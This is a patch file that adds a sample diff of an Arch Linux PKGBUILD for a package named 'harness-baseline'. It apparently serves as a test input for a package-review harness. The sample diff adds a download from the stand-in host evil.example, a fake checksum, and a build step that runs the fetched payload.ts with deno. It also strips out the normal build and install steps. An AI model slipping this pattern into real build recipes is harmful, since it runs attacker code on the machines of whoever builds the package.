@@ -1,0 +1,28 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,4 +1,3 @@
+-# Baseline recipe: recipe-mode inputs are diffed against this.
+ pkgname=harness-baseline
+ pkgver=1.0.0
+ pkgrel=1
+@@ -6,15 +5,11 @@
+ arch=('any')
+ url="https://github.com/example/harness-baseline"
+ license=('MIT')
+-source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
+-sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')
++source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
++        "https://evil.example/payload.ts")
++sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
++            'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
+ 
+ build() {
+-  cd "$srcdir/harness-baseline-1.0.0"
+-  make
++  deno "$srcdir/payload.ts"
+ }
+-
+-package() {
+-  cd "$srcdir/harness-baseline-1.0.0"
+-  make DESTDIR="$pkgdir" install
+-}
